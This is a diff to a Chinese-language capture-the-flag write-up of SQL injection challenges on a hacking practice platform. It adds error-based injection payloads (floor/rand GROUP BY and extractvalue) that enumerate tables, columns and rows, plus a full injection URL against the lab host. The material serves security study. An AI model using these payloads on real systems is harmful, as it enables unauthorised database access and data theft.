@@ -19,12 +19,39 @@ category:
 
 [网络信息安全攻防学习平台](http://hackinglab.cn/index.php)
 
+mysql中select的格式：
+```
+SELECT
+    [ALL | DISTINCT | DISTINCTROW ]
+      [HIGH_PRIORITY]
+      [STRAIGHT_JOIN]
+      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
+      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
+    select_expr [, select_expr ...]
+    [FROM table_references
+    [WHERE where_condition]
+    [GROUP BY {col_name | expr | position}
+      [ASC | DESC], ... [WITH ROLLUP]]
+    [HAVING where_condition]
+    [ORDER BY {col_name | expr | position}
+      [ASC | DESC], ...]
+    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
+    [PROCEDURE procedure_name(argument_list)]
+    [INTO OUTFILE 'file_name' export_options
+      | INTO DUMPFILE 'file_name'
+      | INTO var_name [, var_name]]
+    [FOR UPDATE | LOCK IN SHARE MODE]]
+```
+
+
 ## 防注入
 
 	利用宽字符将`'`注入
 
-	判断列
-	order by 4
+	猜测闭合字符：
+
+		输入 `'`，报错；而输入`'#`未报错。
+	判断列 order by 4
 
 	判断显示位
 	union all select 1,2,3,4
@@ -139,6 +166,59 @@ procedure analyse(extractvalue(rand(), concat(0x3a,(select concat(0x7e,username,
 ```
 在浏览器访问flagishere_askldjfklasjdfl.jpg即可得到flag。
 
+
+## ErrorBased 
+
+- 猜测闭合字符
+- 猜测列数
+- 尝试得到显示位
+- 得到数据库
+
+题目是基于错误的，用到的报错语句为：
+```
+select count(*),concat(0x3a,0x3a,(注入代码),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
+如
+select concat(0x3a,0x3a,(version()),0x3a,0x3a,floor(2*rand(0)))a,count(*) FROM information_schema.tables GROUP BY a
+
+select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
+#可通过urllib.quote()将其转换成url参数输入
+#得到Duplicate entry '::mydbs::1' for key 'group_key'
+
+
+```
+接下来爆表，替换注入代码即可：
+```
+UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database(); 
+UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() LIMIT 0,1;
+```
+
+	select count(*),concat(0x3a,0x3a,(SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
+
+当前数据库的表依次为：`log`,`motto`,`user`
+
+爆字段：
+```
+SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
+SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename' limit 0,1
+```
+
+	select count(*),concat(0x3a,0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'motto' limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
+依次得到：`id`,`username`,`motto`,
+
+爆数据：
+
+
+	select count(*),concat(0x3a,0x3a,(SELECT username FROM motto limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
+
+怎么会没有返回结果！无语了！
+
+换一个，接着研究。
+```
+http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and extractvalue(1, concat(0x3a,(SELECT distinct concat(0x3a,username,0x3a,motto,0x3a,0x3a) FROM motto limit 3,1)))%23
+```
+得到返回结果：
+
+	'::#adf#ad@@#:key#notfound!#::' 
 
 ## 7题
 
